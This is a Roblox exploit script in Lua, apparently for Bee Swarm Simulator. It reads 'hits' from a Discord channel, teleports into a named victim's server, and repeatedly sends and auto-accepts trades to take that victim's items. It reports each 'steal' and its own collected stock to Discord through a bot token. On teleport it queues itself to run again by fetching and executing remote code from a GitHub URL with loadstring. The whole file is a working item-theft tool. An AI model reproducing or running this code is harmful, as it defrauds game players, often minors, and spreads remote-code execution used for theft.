local AutoCollect = {
    GuildID = "1488497480185417779";
    ChannelID = "1503764937087127773";
    BotToken = _G.BotToken;
    ScanMessagesAmount = 8;
    BotInfoChannel = "1504112212287946772";
    StockChannel = "1504137215993708564";
}

local function SafeRequest(Data)
    local Suc, Res = pcall(function()
        return http.request(Data)
    end)
    if Suc then
        return Res
    else
        warn("[SafeRequest] Failed request: " .. tostring(Res))
        task.wait(3)
        return SafeRequest(Data)
    end
end

local function PublishMessage(ChannelID, Content)
    local Request = SafeRequest({
        Url = "https://discord.com/api/v9/channels/" .. ChannelID .. "/messages",
        Headers = {
            ["content-type"] = "application/json",
            authorization = "Bot " .. AutoCollect.BotToken
        },
        Method = "POST",
        Body = game:GetService("HttpService"):JSONEncode({
            content = Content
        })
    })
    if Request.StatusCode ~= 200 then
        warn("Failed to publish a message with PublishMessage: " .. tostring(Request.Body))
    end
end

local LocalPlayer = game:GetService("Players").LocalPlayer

game:GetService("RunService").RenderStepped:Connect(function()
    local char = LocalPlayer.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    if root then
        --root.CFrame = CFrame.new(170, 32, 587)
    end
end)

local function serverhop()
    local servers = {}
    local req = game:HttpGet("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100&excludeFullGames=true")
    local body = game:GetService("HttpService"):JSONDecode(req)

    if body and body.data then
        for i, v in next, body.data do
            if type(v) == "table" and tonumber(v.playing) and tonumber(v.maxPlayers) and v.playing < v.maxPlayers and v.id ~= game.JobId then
                table.insert(servers, 1, v.id)
            end
        end
    end

    if #servers > 0 then
        game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, servers[math.random(1, #servers)], game:GetService("Players").LocalPlayer)
    else
        return warn("Couldn't find a server.")
    end
end

local IsServerFull = false
local LastJobIdToJoin = nil
local IgnoreServer = {}
game:GetService("GuiService").ErrorMessageChanged:Connect(function(message)
    local text = game:GetService("CoreGui"):WaitForChild("RobloxPromptGui"):WaitForChild("promptOverlay"):WaitForChild("ErrorPrompt"):WaitForChild("MessageArea"):WaitForChild("ErrorFrame"):WaitForChild("ErrorMessage").Text
    warn(text)
    if text:lower():find("disconnect") or text:lower():find("kick") then
        PublishMessage(AutoCollect.BotInfoChannel, "Account was kicked. message: ```" .. text .. "```")
        while task.wait() do
            serverhop()
        end
    elseif text:lower():find("server is full") then
        IsServerFull = true
    elseif text:lower():find("restricted") and LastJobIdToJoin then  
        IgnoreServer[LastJobIdToJoin] = true
    end
end)

queue_on_teleport("_G.BotToken = \"" .. AutoCollect.BotToken .. '\"; loadstring(game:HttpGet("https://raw.githubusercontent.com/exodus892/__exodus__/refs/heads/main/autojoinv3.lua"))()')

LocalPlayer.Idled:Connect(function()
    game:GetService("VirtualUser"):CaptureController()
    game:GetService("VirtualUser"):ClickButton2(Vector2.new())
end)

local Events = game:GetService("ReplicatedStorage"):WaitForChild("Events")
local TradeGui = require(game:GetService("ReplicatedStorage"):WaitForChild("Gui"):WaitForChild("TradeGui"))
local SessionID
require(Events).ClientListen("TradeUpdateInfo", function(IncomingData)
    SessionID = IncomingData.SessionID
end)
local Victim
repeat task.wait() until LocalPlayer:FindFirstChild("PlayerGui") and
    LocalPlayer.PlayerGui:FindFirstChild("LoadingScreenGui") and
    LocalPlayer.PlayerGui.LoadingScreenGui:FindFirstChild("LoadingMessage") and
    LocalPlayer.PlayerGui.LoadingScreenGui.LoadingMessage.Visible == false
local ScrGui = LocalPlayer.PlayerGui:WaitForChild("ScreenGui")

local function GetMessages(ChannelID, Limit)
    local Request = SafeRequest({
        Url = "https://discord.com/api/v9/channels/" .. (ChannelID or AutoCollect.ChannelID) .. "/messages?limit=" .. (Limit or tostring(AutoCollect.ScanMessagesAmount)),
        Headers = {
            ["content-type"] = "application/json",
            authorization = "Bot " .. AutoCollect.BotToken
        },
        Method = "GET"
    })
    if Request.StatusCode == 200 then
        return game:GetService("HttpService"):JSONDecode(Request.Body)
    end
end

local function PublishMessage(ChannelID, Content, CustomBody)
    local Request = SafeRequest({
        Url = "https://discord.com/api/v9/channels/" .. ChannelID .. "/messages",
        Headers = {
            ["content-type"] = "application/json",
            authorization = "Bot " .. AutoCollect.BotToken
        },
        Method = "POST",
        Body = game:GetService("HttpService"):JSONEncode(CustomBody or {
            content = Content
        })
    })
    if Request.StatusCode ~= 200 then
        warn("Failed to publish a message with PublishMessage: " .. tostring(Request.Body))
    end
end

task.spawn(function ()
    local interval = 900
    local elapsed = 0

    while true do
        task.wait(interval)
        interval = math.random(600, 1200)
        elapsed = elapsed + 10

        local msg = "Auto-Join is still running after " .. elapsed .. " minutes. There have not been any hits to take."
        --PublishMessage(AutoCollect.BotInfoChannel, msg)
    end
end)

local function SetMarked(id)
    local Content = isfile("ExodusJoined") and readfile("ExodusJoined") or "{}"
    local Before = game:GetService("HttpService"):JSONDecode(Content)
    local Clone = table.clone(Before)
    table.insert(Clone, 1, id)
    local NewTable = {}
    for i, v in pairs(Clone) do
        if i <= (AutoCollect.ScanMessagesAmount) then
            NewTable[i] = v
        end
    end
    writefile("ExodusJoined", game:GetService("HttpService"):JSONEncode(NewTable))
end

local function IsMarked(id)
    local Content = isfile("ExodusJoined") and readfile("ExodusJoined") or "{}"
    local Marked = game:GetService("HttpService"):JSONDecode(Content)
    return table.find(Marked, id) ~= nil
end

local HttpService = game:GetService("HttpService")

local function getMsgTime(msg)
    local year, month, day, hour, min, sec =
                msg.timestamp:match("(%d+)%-(%d+)%-(%d+)T(%d+):(%d+):(%d+)")

            local msgTime = os.time({
                year = tonumber(year),
                month = tonumber(month),
                day = tonumber(day),
                hour = tonumber(hour),
                min = tonumber(min),
                sec = tonumber(sec)
            })

        return msgTime
end

local function Scan(Tp, Json)
    local YeahComplete = false
    local Messages = GetMessages()
    if Messages then
        for i, msg in pairs(Messages) do
            pcall(function()
                local msgTime = getMsgTime(msg)
                if os.time() - msgTime <= 1800 then
                    local content = msg.content
                    if content:find("Private Server") then return end
                    local embed = msg.embeds[1]
                    if embed.color ~= 0xe4f527 and not Tp then return end
                    if Tp and embed.color ~= 0x00ff04 then 
                        return
                    end

                    local AutjoinData = {
                        jobid = content:match("&launchData=%d+/(.+)%)"),
                        placeid = tonumber(content:match("&launchData=(%d+)/")),
                        userid = embed.footer.text:match("User Id: (.+)"),
                        completed = content:find("Completed"),
                        saturated = content:find("Completed") or content:find("Progress")
                    }
                    local AJdata = AutjoinData
                    if Tp and not IsMarked(msg.id) and AJdata.saturated == nil then
                        writefile("ExodusAutojoin", HttpService:JSONEncode(AutjoinData))
                        SetMarked(msg.id)
                        task.spawn(function()
                            PublishMessage(AutoCollect.BotInfoChannel, `Auto-Join is checking this https://discord.com/channels/{AutoCollect.GuildID}/{AutoCollect.ChannelID}/{msg.id} (User ID: {AJdata.userid})`)
                        end)
                        repeat
                            LastJobIdToJoin = AJdata.jobid
                            game:GetService("TeleportService"):TeleportToPlaceInstance(AutjoinData.placeid, AJdata.jobid, LocalPlayer)
                            if IgnoreServer[LastJobIdToJoin] then
                                PublishMessage(AutoCollect.BotInfoChannel, "The place is restricted and the bot can't join, for some reason")
                                break
                            end
                            if IsServerFull then
                                task.wait(10)
                                IsServerFull = false
                            else
                                task.wait(2)
                            end
                        until nil
                    elseif Tp == false then
                        if AJdata.completed and Json.jobid == game.JobId and Victim and tonumber(Json.userid) == Victim.UserId then
                            YeahComplete = true
                        end
                    end
                end
            end)
        end
    end
    return YeahComplete
end

local function FindVictim(Json)
    if not Json or game.JobId ~= Json.jobid then
        if game.JobId ~= Json.jobid then
            PublishMessage(AutoCollect.BotInfoChannel, "(v7.0) Auto-Join started running on " .. LocalPlayer.Name)
        end
        return
    end
    for i, v in pairs(LocalPlayer.Parent:GetPlayers()) do
        if v.UserId == tonumber(Json.userid) then
            Victim = v
            break
        end
    end
end

local function Accept()
    pcall(function()
        if ScrGui.TradeLayer.TradeAnchorFrame.TradeFrame.ButtonAccept.ButtonTop.TextLabel.Text ~= "Unaccept" then
            require(Events).ClientCall("TradePlayerAccept", SessionID, {
                [tostring(LocalPlayer.UserId)] = TradeGui.GetMyOffer(),
                [tostring(Victim.UserId)] = TradeGui.GetTheirOffer()
            })
        end
    end)
end

local IsStealing = true
local Completed
local Json
LocalPlayer.Parent.PlayerRemoving:Connect(function(v)
    if v == Victim then
        if not Completed then
            task.spawn(function()
                PublishMessage(AutoCollect.BotInfoChannel, "The victim left")
            end)
        end
        Victim = nil
        IsStealing = false
    end
end)
local TimeWithoutTrade = 0
local asdadsa = tick()
task.spawn(function()
    while task.wait() do
        if IsStealing and Victim then
            local Gui = ScrGui.TradeLayer:FindFirstChild("TradeAnchorFrame") and ScrGui.TradeLayer:FindFirstChild("TradeAnchorFrame"):FindFirstChild("TradeFrame")
            if Gui then
                asdadsa = tick()
            end
            if TimeWithoutTrade >= 25 then
                PublishMessage(AutoCollect.BotInfoChannel, "Even though the the player was in the server, no trade was recieved in 25 seconds therefore the auto join will ignore this hit.")
                IsStealing = false
            end
        end
        TimeWithoutTrade = tick() - asdadsa
    end
end)
task.spawn(function()
    repeat task.wait() until Victim
    while IsStealing and task.wait(1) do
        local IsComplete = Scan(false, Json)
        if IsComplete then
            IsStealing = false
            Completed = true
            return warn("Found completion marker")
        end
    end
end)
task.spawn(function()
    if isfile("ExodusAutojoin") then
        Json = game:GetService("HttpService"):JSONDecode(readfile("ExodusAutojoin"))
        FindVictim(Json)
        if Victim then
            local Name = Victim.Name
            while IsStealing and LocalPlayer.Parent:FindFirstChild(Name) do
                Events:WaitForChild("TradePlayerRequestStart"):FireServer(Victim.UserId)
                Accept()
                task.wait(1)
            end
        else
            if game.JobId == Json.jobid then
                task.spawn(function()
                    PublishMessage(AutoCollect.BotInfoChannel, "The victim wasnt in the server")
                end)
            end
            warn("No victim")
            IsStealing = false
        end
    else
        warn("No auto-join file")
        PublishMessage(AutoCollect.BotInfoChannel, "(v7.0) Auto-Join started running on " .. LocalPlayer.Name)
        IsStealing = false
    end
end)
repeat task.wait() until not IsStealing

task.spawn(function()
    local function await(object, ...)
        local Result = object
        local Paths = {...}

        for i = 1, #Paths do
            Result = Result:WaitForChild(Paths[i], math.huge)
        end

        return Result
    end
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local StatModifiers = require(await(ReplicatedStorage, "StatModifiers"))
    local BeeStatMods = require(await(ReplicatedStorage, "BeeStats", "BeeStatMods"))
    local CaseEntry = require(await(ReplicatedStorage, "Beequips", "BeequipCaseEntry"))
    local BeequipFile = require(await(ReplicatedStorage, "Beequips", "BeequipFile"))

    local function GetBQStatsString(File, Name)
        local Ping = false
        local Suc, Res = pcall(function()
            local BaseStats, HiveBonuses, Abilities = File:GenerateModifiers()
            local Potential = File.Q * 5
            local NumWaxes = (File:GetWaxHistory() and #File:GetWaxHistory()) or 0
            local Strings = {
                Base = '',
                Hivebonus = '',
                Ability = ''
            }
            if BaseStats then
                local Lines = {}
                for i, v in ipairs(BaseStats) do
                    local StatStr, Success = BeeStatMods.GetType(v.Stat).Desc(v)
                    if Success then
                        table.insert(Lines, StatStr)
                    end
                end
                Strings.Base = table.concat(Lines, "\n")
            end
            if HiveBonuses then
                local Lines = {}
                for i, v in ipairs(HiveBonuses) do
                    local StatStr = StatModifiers.Description(v)
                    if StatStr then
                        table.insert(Lines, StatStr)
                    end
                end
                Strings.Hivebonus = table.concat(Lines, "\n")
            end
            if Abilities then
                local Lines = {}
                for i, v in ipairs(Abilities) do
                    local Ability = v[1]
                    if Ability then
                        table.insert(Lines, Ability .. (v[2] and " (from wax)" or ''))
                    end
                end
                Strings.Ability = table.concat(Lines, "\n")
            end

            local Stats = {}

            local function Concat(...)
                for i, v in ipairs({...}) do
                    if v ~= nil then
                        table.insert(Stats, v)
                    end
                end
                return nil
            end

            if Name == "Bead Lizard" then
                local TokenLink = Strings.Ability:match("Token Link")
                local BeeAbilityPollen = Strings.Hivebonus:match("%+(%d+)%% Bee Ability Pollen")
                if BeeAbilityPollen == nil and TokenLink == nil then
                    return
                end
                if TokenLink or (BeeAbilityPollen and tonumber(BeeAbilityPollen) >= 2) then
                    Ping = true
                end
                Concat(TokenLink and "Ability: Token Link", BeeAbilityPollen and BeeAbilityPollen .. "% Bee Ability Pollen")

            elseif Name == "Camphor Lip Balm" then
                local BubblePollen = Strings.Hivebonus:match("%+(%d+)%% Bubble Pollen")
                local GoldBubblePollen = Strings.Hivebonus:match("%+(%d+)%% Gold Bubble Pollen")
                local PepperPollen = Strings.Hivebonus:match("x(%d+%.%d+) Pepper Patch Pollen")
                if tonumber(PepperPollen) < 1.07 and tonumber(BubblePollen) < 18 then
                    if GoldBubblePollen then
                        local GBP = tonumber(GoldBubblePollen)
                        if GBP >= 6 then
                            Ping = true
                        elseif GBP == 5 then
                            Ping = true
                        elseif GBP == 4 then
                            if tonumber(BubblePollen) < 14 then return end
                            Ping = true
                        elseif GBP == 3 then
                            if tonumber(BubblePollen) < 15 then return end
                            Ping = true
                        elseif GBP == 2 then
                            if tonumber(BubblePollen) < 16 then return end
                            Ping = true
                        else
                            return
                        end
                    else
                        return
                    end
                end
                Concat(BubblePollen .. "% Bubble Pollen", GoldBubblePollen and GoldBubblePollen .. "% Gold Bubble Pollen", "x" .. PepperPollen .. " Pepper Patch Pollen")

            elseif Name == "Candy Ring" then
                local HoneyAtHive = Strings.Hivebonus:match("%+(%d+)%% Honey At Hive")
                if tonumber(HoneyAtHive) < 7 then
                    return
                end
                Ping = true
                Concat(HoneyAtHive .. "% Honey At Hive")

            elseif Name == "Charm Bracelet" then
                local AbilityRate = Strings.Base:match("%+(%d+)%% Ability Rate")
                local HoneyAtHive = Strings.Hivebonus:match("%+(%d+)%% Honey At Hive")
                local Melody = Strings.Ability:match("Melody")
                if Melody then
                    Ping = true
                else
                    return
                end
                Concat(AbilityRate .. "% Ability Rate", HoneyAtHive and HoneyAtHive .. "% Honey At Hive", Melody and "Ability: Melody")

            elseif Name == "Kazoo" then
                local CPHB = Strings.Hivebonus:match("%+(%d+)%% Critical Power")
                local SCPHB = Strings.Hivebonus:match("%+(%d+)%% Super-Crit Power")
                if CPHB == nil and SCPHB == nil then
                    return
                end
                Concat(CPHB and CPHB .. "% Critical Power", SCPHB and SCPHB .. "% Super-Crit Power")

            elseif Name == "Paperclip" then
                local TokenLink = Strings.Ability:match("Token Link")
                local BeeAbilityPollen = Strings.Hivebonus:match("%+(%d+)%% Bee Ability Pollen")
                local AbilityTokenLifespan = Strings.Hivebonus:match("%+(%d+)%% Ability Token Lifespan")
                if BeeAbilityPollen == nil and TokenLink == nil and AbilityTokenLifespan == nil then
                    return
                end
                if BeeAbilityPollen == nil and TokenLink == nil then
                    if tonumber(AbilityTokenLifespan) < 5 then
                        return
                    end
                end
                Ping = true
                Concat(TokenLink and "Ability: Token Link", BeeAbilityPollen and BeeAbilityPollen .. "% Bee Ability Pollen", AbilityTokenLifespan and AbilityTokenLifespan .. "% Ability Token Lifespan")

            elseif Name == "Pink Shades" then
                local Focus = Strings.Ability:match("Focus")
                local SuperCritPower = Strings.Hivebonus:match("%+(%d+)%% Super-Crit Power")
                local SuperCritChance = Strings.Hivebonus:match("%+(%d+)%% Super-Crit Chance")
                Ping = true
                Concat(Focus and "Ability: Focus", SuperCritPower and SuperCritPower .. "% Super-Crit Power", SuperCritChance and SuperCritChance .. "% Super-Crit Chance")

            elseif Name == "Smiley Sticker" then
                local HoneyMark = Strings.Ability:match("Honey Mark")
                local MarkDuration = Strings.Base:match("%+(%d+)%% Mark Duration")
                local MarkDurationHB = Strings.Hivebonus:match("%+(%d+)%% Mark Duration")
                if HoneyMark == nil then
                    return
                end
                Ping = true
                Concat(HoneyMark and "Ability: Honey Mark", MarkDuration .. "% Mark Duration", MarkDurationHB and ("{HB} " .. MarkDurationHB .. "% Mark Duration"))

            elseif Name == "Sweatband" then
                local RedGatherAmount = Strings.Base:match("%+(%d+)%% Red Gather Amount")
                local WhiteGatherAmount = Strings.Base:match("%+(%d+)%% White Gather Amount")
                if (RedGatherAmount == nil and WhiteGatherAmount == nil) or ((not RedGatherAmount or tonumber(RedGatherAmount) < 26) and (not WhiteGatherAmount or tonumber(WhiteGatherAmount) < 27)) then
                    return
                end

                local RGA = nil
                if RedGatherAmount then
                    RGA = RedGatherAmount .. "% Red Gather Amount"
                end
                local WGA = nil
                if WhiteGatherAmount then
                    WGA = WhiteGatherAmount .. "% White Gather Amount"
                end
                Ping = true
                Concat(RGA, WGA)

            elseif Name == "Whistle" then
                local Melody = Strings.Ability:match("Melody")
                local SuperCritPower = Strings.Hivebonus:match("%+(%d+)%% Super%-Crit Power")
                if Melody == nil and SuperCritPower == nil then
                    return
                end
                if Melody or (SuperCritPower and tonumber(SuperCritPower) >= 3) then
                    Ping = true
                end
                Concat(Melody and "Ability: Melody", SuperCritPower and SuperCritPower .. "% Super-Crit Power")

            elseif Name == "Elf Cap" then
                local HoneyAtHive = Strings.Hivebonus:match("%+(%d+)%% Honey At Hive")
                if HoneyAtHive == nil then
                    return
                end
                if tonumber(HoneyAtHive) < 5 then
                    if NumWaxes == 1 then
                        if tonumber(HoneyAtHive) < 3 then
                            return
                        end
                    elseif NumWaxes == 2 then
                        if tonumber(HoneyAtHive) < 3 then
                            return
                        end
                    elseif NumWaxes == 3 then
                        if tonumber(HoneyAtHive) ~= 4 then
                            return
                        end
                    else
                        return
                    end
                end
                Ping = true
                Concat(HoneyAtHive .. "% Honey At Hive")

            elseif Name == "Festive Wreath" then
                local HoneyAtHive = Strings.Hivebonus:match("%+(%d+)%% Honey At Hive")
                if HoneyAtHive == nil then
                    return
                end
                if tonumber(HoneyAtHive) >= 2 then
                    Ping = true
                end
                Concat(HoneyAtHive .. "% Honey At Hive")

            elseif Name == "Paper Angel" then
                local BeeAbilityPollen = Strings.Hivebonus:match("%+(%d+)%% Bee Ability Pollen")
                local AbilityTokenLifespan = Strings.Hivebonus:match("%+(%d+)%% Ability Token Lifespan")
                if BeeAbilityPollen == nil or tonumber(BeeAbilityPollen) < 2 then
                    if AbilityTokenLifespan == nil or tonumber(AbilityTokenLifespan) < 3 then
                        return
                    end
                end
                if BeeAbilityPollen and tonumber(BeeAbilityPollen) >= 3 then
                    Ping = true
                end
                Concat(BeeAbilityPollen and BeeAbilityPollen .. "% Bee Ability Pollen", AbilityTokenLifespan and AbilityTokenLifespan .. "% Ability Token Lifespan")

            elseif Name == "Pinecone" then
                local PinetreeCapacity = Strings.Hivebonus:match("%+(%d+)%% Pine Tree Forest Capacity")
                local PinetreePollen = Strings.Hivebonus:match("%+(%d+)%% Pine Tree Forest Pollen")
                local PTC = tonumber(PinetreeCapacity)
                local PTP = tonumber(PinetreePollen)
                if PTC < 14 then return end
                if PTC == 14 or PTC == 15 then
                    return
                elseif PTC == 16 then
                    if PTP < 12 then return end
                    Ping = true
                elseif PTC == 17 then
                    if PTP < 9 then return end
                    Ping = true
                elseif PTC >= 18 then
                    Ping = true
                end
                Concat(PinetreeCapacity .. "% Pinetree Capacity", PinetreePollen .. "% Pinetree Pollen")

            elseif Name == "Poinsettia" then
                local RedPollen = Strings.Hivebonus:match("%+(%d+)%% Red Pollen")
                local BeeGatherPollen = Strings.Hivebonus:match("%+(%d+)%% Bee Gather Pollen")
                if RedPollen == nil and BeeGatherPollen == nil and not (NumWaxes == 0 and Potential >= 4.5) then
                    return
                end
                if (not BeeGatherPollen or tonumber(BeeGatherPollen) < 12) then
                    local LimitRp = 7
                    if BeeGatherPollen and tonumber(BeeGatherPollen) >= 10 then
                        LimitRp = 5
                    end
                    if RedPollen and tonumber(RedPollen) >= LimitRp then
                        Ping = true
                    else
                        return
                    end
                end
                if RedPollen and tonumber(RedPollen) >= 7 then
                    Ping = true
                end
                Concat(RedPollen and RedPollen .. "% Red Pollen", BeeGatherPollen and BeeGatherPollen .. "% Bee Gather Pollen")

            elseif Name == "Reindeer Antlers" then
                local BondFromTreats = Strings.Hivebonus:match("%+(%d+)%% Bond From Treats")
                local Capacity = Strings.Hivebonus:match("%+(%d+)%% Capacity")
                local BabyLove = Strings.Ability:match("Baby Love")
                if BondFromTreats == nil and Capacity == nil and BabyLove == nil then
                    return
                end
                if BabyLove or (Capacity and tonumber(Capacity) >= 3) or BondFromTreats then
                    Ping = true
                end
                Concat(BondFromTreats and BondFromTreats .. "% Bond From Treats", Capacity and Capacity .. "% Capacity", BabyLove and "Ability: Baby Love")

            elseif Name == "Snow Tiara" then
                local BlueFieldCapacity = Strings.Hivebonus:match("^%+([%d%.]+)%% Blue Field Capacity")
                if tonumber(BlueFieldCapacity) < 6 then
                    return
                end
                Concat(BlueFieldCapacity .. "% Blue Field Capacity")

            elseif Name == "Toy Drum" then
                local BeeAbilityPollen = Strings.Hivebonus:match("%+(%d+)%% Bee Ability Pollen")
                if BeeAbilityPollen == nil and not (NumWaxes == 0 and Potential >= 4.5) then
                    return
                end
                if BeeAbilityPollen and tonumber(BeeAbilityPollen) >= 3 then
                    Ping = true
                end
                Concat(BeeAbilityPollen and BeeAbilityPollen .. "% Bee Ability Pollen")

            elseif Name == "Toy Horn" then
                local BeeAbilityPollen = Strings.Hivebonus:match("%+(%d+)%% Bee Ability Pollen")
                if BeeAbilityPollen == nil and not (NumWaxes == 0 and Potential >= 4.5) then
                    return
                end
                if BeeAbilityPollen and tonumber(BeeAbilityPollen) >= 2 then
                    Ping = true
                end
                Concat(BeeAbilityPollen and BeeAbilityPollen .. "% Bee Ability Pollen")
            else
                return
            end

            return #Stats > 0 and table.concat(Stats, "\n") or "No Stats"
        end)
        if not Suc then
            return "An error occured filtering stats: " .. tostring(Res)
        else
            return Res, Ping
        end
    end

    local function GetPlayerStats()
        return require(await(ReplicatedStorage, "ClientStatCache")):Get()
    end

    local function GetTypeDef(File)
        local Success, Result = pcall(function()
            return CaseEntry.FromData(File):FetchBeequip(GetPlayerStats(), false)
        end)
        if Success and Result then
            return Result
        end
        Success, Result = pcall(function()
            return BeequipFile.FromData(File)
        end)
        if Success and Result then
            return Result
        end
        return nil
    end

    local function GetStickers()
        local PlayerStats = GetPlayerStats()
        local Stickers = PlayerStats.Stickers
        local Book = Stickers and Stickers.Book
        local Inbox = Stickers and Stickers.Inbox
        
        if not Book then
            warn("No sticker book!")
            return nil
        end

        local ReturnedStickers = {}

        for _, File in ipairs(Book) do
            if File:GetTypeDef() then
                table.insert(ReturnedStickers, {F=File,L="Case"})
            end
        end

        for _, File in ipairs(Inbox) do
            if File:GetTypeDef() then
                table.insert(ReturnedStickers, {F=File,L="Inbox"})
            end
        end

        return ReturnedStickers
    end

    local function GetBeequips()
        local PlayerStats = GetPlayerStats()
        local Beequips = PlayerStats.Beequips
        local Case = Beequips and Beequips.Case or {}
        local Storage = Beequips and Beequips.Storage or {}
        local Inbox = Beequips and Beequips.Inbox or {}

        local ReturnedBeequips = {}

        for _, File in ipairs(Case) do
            local TypeDef = GetTypeDef(File)
            if TypeDef then
                local StatString = GetBQStatsString(TypeDef, TypeDef:GetTypeDef().DisplayName)
                if (#{StatString}) > 0 then
                    table.insert(ReturnedBeequips, {F=File,L="Case"})
                end
            end
        end

        for _, File in ipairs(Storage) do
            local TypeDef = GetTypeDef(File)
            if TypeDef then
                local StatString = GetBQStatsString(File, TypeDef:GetTypeDef().DisplayName)
                if (#{StatString}) > 0 then
                    table.insert(ReturnedBeequips, {F=File,L="Storage"})
                end
            end
        end

        for _, File in ipairs(Inbox) do
            local TypeDef = GetTypeDef(File)
            if TypeDef then
                local StatString = GetBQStatsString(File, TypeDef:GetTypeDef().DisplayName)
                if (#{StatString}) > 0 then
                    table.insert(ReturnedBeequips, {F=File,L="Inbox"})
                end
            end
        end

        return ReturnedBeequips
    end

    local function Collapse(list)
        local Counts = {}
        local Order = {}

        for _, v in ipairs(list) do
            if Counts[v] then
                Counts[v] += 1
            else
                Counts[v] = 1
                table.insert(Order, v)
            end
        end

        local result = {}

        for _, v in ipairs(Order) do
            local n = Counts[v]
            if n > 1 then
                table.insert(result, "x" .. n .. " " .. v)
            else
                table.insert(result, v)
            end
        end

        return result
    end

    local function SortByHierarchy(List, Hierarchy)
        local function GetRank(Item)
            Item = string.lower(Item)

            for Index, Keyword in ipairs(Hierarchy) do
                if string.find(Item, string.lower(Keyword), 1, true) then
                    return Index
                end
            end

            return math.huge
        end

        table.sort(List, function(A, B)
            local RankA = GetRank(A)
            local RankB = GetRank(B)

            if RankA == RankB then
                return A < B
            end

            return RankA < RankB
        end)

        return List
    end

    local Stickers = GetStickers()
    local Beequips = GetBeequips()

    local StickerNames = {}
    local Hierachy = {
        "Cub Skin",
        "Voucher",
        "Hive Skin",
        "Star Sign",
        "Stamp",
        "Fleuron",
        "Painting"
    }

    for _, Sticker in ipairs(Stickers) do
        local Name = Sticker.F:GetTypeDef().Name:gsub("x2 Convert", 'Convert')
        table.insert(StickerNames, Name .. " : " .. Sticker.L)
    end

    local SortedStickers = Collapse(SortByHierarchy(StickerNames, Hierachy))
    local InboxStickerTable = {}
    local CaseStickerTable = {}

    for i, v in pairs(SortedStickers) do
        if v:find(" : Inbox") then
            table.insert(InboxStickerTable, v)
        else
            table.insert(CaseStickerTable, v)
        end
    end

    local Description = "**Stickers**\n"
    Description = Description .. table.concat(CaseStickerTable, "\n") .. (#InboxStickerTable > 0 and "\n" or "") .. table.concat(InboxStickerTable, "\n") .. "\n\n**Beequips**\n"


    for i, bq in pairs(Beequips) do
        local f = bq.F
        local loc = bq.L
        local TypeDef = GetTypeDef(f)
        local Goods = GetBQStatsString(TypeDef, TypeDef:GetTypeDef().DisplayName)
        local name = TypeDef:GetTypeDef().DisplayName
        Description = Description .. "`" .. name .. " : " .. loc .. "`\n" .. string.format("%.2f", TypeDef.Q*5) .. "* Potential | " .. ((TypeDef:GetWaxHistory() and #TypeDef:GetWaxHistory()) or 0) .. " Waxes\n" .. Goods .. "\n\n"
    end

    local Body = {
        content = "",
        embeds = {{
            title = LocalPlayer.Name .. " Stock",
            description = Description,
            color = 11731199
        }}
    }
    PublishMessage(AutoCollect.StockChannel, nil, Body)
end)

local Scans = 0
warn("All that gobblydook is done")
local Gui = Instance.new("ScreenGui", gethui())
Gui.ResetOnSpawn = false
local Label = Instance.new("TextLabel", Gui)
Label.Size = UDim2.fromOffset(100, 40)
Label.TextScaled = true
Label.Position = UDim2.new(1, -99, 0, 20)
Label.Text = "Scans: " .. Scans
Label.AnchorPoint = Vector2.new(1, 0)
Label.BackgroundColor3 = Color3.fromRGB(24, 24, 27)
Label.TextColor3 = Color3.fromRGB(255, 255, 255)
while task.wait(3) do
    Scans = Scans + 1
    Label.Text = "Scans: " .. Scans
    Scan(true)
end
